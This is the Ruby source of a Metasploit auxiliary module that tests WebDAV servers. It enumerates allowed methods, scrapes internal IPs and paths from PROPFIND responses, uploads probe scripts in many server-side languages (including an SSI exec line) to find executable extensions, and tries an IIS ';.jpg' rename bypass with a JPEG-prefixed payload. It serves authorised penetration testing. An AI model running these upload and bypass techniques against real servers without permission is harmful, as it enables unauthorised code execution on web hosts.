##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'pp'


class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WmapScanServer
	# Scanner mixin should be near last
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'HTTP WebDAV Tester',
			'Version'     => '$Id: webdav_test.rb 37 2010-05-04 21:58:59Z sussurro $',
			'Description' => 'Evaluate a path to determine what can be created/uploaded',
			'Author'       => ['Ryan Linn <sussurro[at]happypacket.net'],
			'License'     => MSF_LICENSE
		)
                register_options(
                        [
                                OptString.new('PATH', [ true,  "The URI Path", '/testpath/'])
			], self.class)

		
	end

 	@@jpg_file = Rex::Text.decode_base64("/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AR//Z")

	# that can be found at http://code.google.com/p/davtest
	@@checks = {
		'asp' => '<html><body><% response.write (!N1! * !N2!) %>',
		'aspx' => '<html><body><% response.write (!N1! * !N2!) %>',
		'cfm' => '<cfscript>WriteOutput(!N1!*!N2!);</cfscript>',
		'cgi' => "#!/usr/bin/perl\nprint \"Content-Type: text/html\n\r\n\r\" . !N1! * !N2!;",
		'html' => '!S1!<br />',
		'jhtml' => '<%= System.out.println(!N1! * !N2!); %>',
		'jsp' => '<%= System.out.println(!N1! * !N2!); %>',
		'php' => '<?php print !N1! * !N2!;?>',
		'pl' => "#!/usr/bin/perl\nprint \"Content-Type: text/html\n\r\n\r\" . !N1! * !N2!;",
		'shtml' => '<!--#echo var="DOCUMENT_URI"--><br /><!--#exec cmd="echo !S1!"-->',
		'txt' => '!S1!'
	}


	def get_options(target_url)
		begin
                        res = send_request_raw({
                                'uri'          => target_url,                                  
                                'method'       => 'OPTIONS'
                        }, 10)          

			if res and res.code == 200
				ret = {}	
				ret[:server_type] = res.headers['Server']
				ret[:options_allowed] = res.headers['Allow']
				ret[:options_public] = res.headers['Public']
				ret[:webdav] = false
				
				if (res.headers['DAV'] and res.headers['MS-Author-Via'].match('DAV'))
                                        ret[:webdav] = true
					ret[:webdav_type] = "unknown"
                                        if res.headers['X-MSDAVEXT']
						ret[:webdav_type] = 'SHAREPOINT DAV'
                                        end
					if res.headers['DAV'].match("apache")
						ret[:webdav_type] = "Apache DAV"
					end
				end
				return ret
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		return false
		end
		return false
	
	end

	def check_propfind(target_url)
		begin
			res = send_request_raw({
				'uri'          => target_url,
				'method'       => 'PROPFIND',
                                'headers' => { 'Depth' => 1 , 'Content-Length' => 0}
			})

			return false if res and res.code != 207
                        ret = {}
			doc = REXML::Document.new(res.body)
			ret[:success] = false
			doc.elements.each('D:multistatus/D:response/D:propstat/D:status') do |e|
				ret[:success] = true if(e.to_a.to_s.index("200"))
			end

                        #find internal IPs.. 
                        intipregex = /(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/i

                        #find directories..
                        urlregex = /<.:href[^>]*>(.*?)<\/.:href>/i

			ret[:ips] = res.body.scan(intipregex).uniq
			ret[:paths] = res.body.scan(urlregex).uniq
			return ret


		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		return false
		end
		return false
	
	end

	def check_createdir(target_url)
		begin
			res = send_request_raw({
				'uri'          => target_url,
				'method'       => 'MKCOL',
                                'headers' => { 'Content-Length' => 0}
			})

			return true if res and res.code >= 200 and res.code < 300
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		return false
		end
	
	end

	def cleanup_dir(target_url)
		begin
			res = send_request_raw({
				'uri'          => target_url + "/",
				'method'       => 'DELETE',
                                'headers' => { 'Content-Length' => 0}
			})

			return true if res and res.code >= 200 and res.code < 300

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		return false
		end
	
	end

	def check_extensions(target_url)
		result = []
		# These checks are based off of Chris Sullo's davtest perl script
		@@checks.each do |ext,payload|
			begin
				answer = nil
				
				fnr = Rex::Text.rand_text_alphanumeric(15)
				fn = target_url + "/" + fnr + "." + ext
				#print_status("Trying #{fn}")
				if(payload.index("!N1!"))
					r1 = rand(10000)/100 * 10
					r2 = rand(10000)/100 * 10
					answer = (r1 *r2).to_s
					payload = payload.gsub("!N1!",r1.to_s)	
					payload = payload.gsub("!N2!",r2.to_s)	
				else
					answer = Rex::Text.rand_text_alphanumeric(25)
					payload = payload.gsub("!S1!",answer)
				end
				payload += "\n\n"
				res = send_request_raw({
					'uri'           => fn,
					'method'        => 'PUT',
					'data'		=> payload,
                                	'headers' => { 'Content-Length' => payload.length }
				},5)
				if(not res or res.code != 201)
					result << [ext,false,false]
					next
				end
				res = send_request_raw({
					'uri'           => fn,
					'method'        => 'GET'
				})
				if(not res or res.code != 200 or not res.body.index(answer) or res.body.index("#exec"))
					result << [ext,true,false]
					next
				end

				result << [ext,true,true]
				next
				
			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE
			end
			result[ext] = false
		end
		result
	end

	def check_rename(hostname,target_url)
		result = []
		# These checks are based off of Chris Sullo's davtest perl script
		@@checks.each do |ext,payload|
			begin
				answer = nil
				
				fnr = Rex::Text.rand_text_alphanumeric(15)
				fn = target_url + "/" + fnr + "." + 'txt'
				fnd = "http://" + hostname + target_url + "/" + fnr + "." + ext + ';.jpg'
				#print_status("Trying #{fnd}")
				if(payload.index("!N1!"))
					r1 = rand(10000)/100 * 10
					r2 = rand(10000)/100 * 10
					answer = (r1 *r2).to_s
					payload = payload.gsub("!N1!",r1.to_s)	
					payload = payload.gsub("!N2!",r2.to_s)	
				else
					answer = Rex::Text.rand_text_alphanumeric(25)
					payload = payload.gsub("!S1!",answer)
				end
				payload = @@jpg_file + payload + "\n\n"
				res = send_request_raw({
					'uri'           => fn,
					'method'        => 'PUT',
					'data'		=> payload,
                                	'headers' => { 'Content-Length' => payload.length }
				},5)
				if(not res or res.code != 201)
					result << [ext,false,false]
					next
				end
				res = send_request_raw({
					'uri'           => fn,
					'method'        => 'MOVE',
					'headers'	=> { 'Destination' => fnd }
				})
				if(not res or res.code != 201 )
					result << [ext,true,false]
					next
				end
				

				res = send_request_raw({
					'uri'           => fnd,
					'method'        => 'GET'
				})
				if(not res or res.code != 200 or not res.body.index(answer) or res.body.index("#exec"))
					result << [ext,true,false]
					next
				end

				result << [ext,true,true]
				next
				
			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE
			end
			result[ext] = false
		end
		result
	end

	def run_host(target_host)
		path = datastore['PATH']
		info = get_options(path)
		enabled = false

		if(info)
			if(info[:webdav])
				enabled = true
				print_status("#{target_host}#{path} (#{info[:server_type]}) has #{info[:webdav_type]} ENABLED")
				print_status("#{target_host}#{path} (#{info[:server_type]}) Allows Methods: #{info[:options_allowed]}")
				if(info[:options_public])
					print_status("#{target_host}#{path} (#{info[:server_type]}) Has Public Methods: #{info[:options_public]}")
				end
			else
				print_status("#{target_host}#{path} (#{info[:server_type]}) is not reporting WEBDAV methods")
			end
			report_note(
				:host	=> target_host,
				:proto	=> 'HTTP',
				:port	=> rport,
				:type	=> "SERVER OPTIONS",
				:data	=> info
			)
		end
				
		davinfo = check_propfind(path)
		if(davinfo)
			if(davinfo[:success] and !enabled)
				print_status("#{target_host}#{path} has DAV ENABLED")
			end
			if(davinfo[:ips].length > 0 )
				print_status("#{target_host}#{path} exposed ips #{davinfo[:ips].join(",")}")
			end
			if(davinfo[:paths])
				print_status("#{target_host}#{path} exposed paths #{davinfo[:paths].join(",")}")
			end
			report_note(
				:host	=> target_host,
				:proto	=> 'HTTP',
				:port	=> rport,
				:type	=> "DAV_DISCLOSURE",
				:data	=> davinfo 
			)
			
		else
			print_status("#{target_host}#{path} has DAV DISABLED")
			return
		end

		randstr = Rex::Text.rand_text_alphanumeric(10)
		testdir = path + "WebDavTest_" + randstr
		print_status("Attempting to create #{testdir}")
		if(check_createdir(testdir))
			print_status("#{target_host}#{path} is WRITEABLE")
		else
			print_status("#{target_host}#{path} is NOT WRITEABLE")
			return
		end
		print_status("Checking extensions for upload and execution")
		results = check_extensions(testdir)

		print_status("Attempting to use IIS rename/copy to bypass restrictions")
		results2 = check_rename(target_host,testdir)

		print_status("Attempting to cleanup #{testdir}")
		cleanup_dir(testdir)
		uploadable = []
		executable = []
		iis_renameable = []
		results.each do |ext,upl,exe|
		 	if(upl)
				uploadable << ext
			end
			if(exe)
				executable << ext
			end
		end
		results2.each do |ext,upl,exe|
			iis_renameable << ext if (exe)
		end
		print_status("Uploadable files are: #{uploadable.join(",")}")
		print_status("Executable files are: #{executable.join(",")}")
		print_status("IIS rename/executable files are: #{iis_renameable.join(",")}")
		ndata = {}
		ndata[:executable] = executable
		ndata[:uploadable] = uploadable
		ndata[:iis_renamable] = iis_renameable

				
		report_note(
			:host	=> target_host,
			:proto	=> 'HTTP',
			:port	=> rport,
			:type	=> "WRITABLE/EXECUTABLE DAV",
			:data	=> ndata
		)
			
	end
end

